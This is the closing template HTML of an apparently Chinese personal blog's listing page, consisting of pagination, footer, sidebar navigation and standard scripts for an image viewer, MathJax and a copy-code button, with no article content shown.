  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> f14g
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="f14g"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/me">关于我</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends_link">友链</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->
 <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
<script>
  var ayerConfig = {
    mathjax: true,
  };
</script>

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>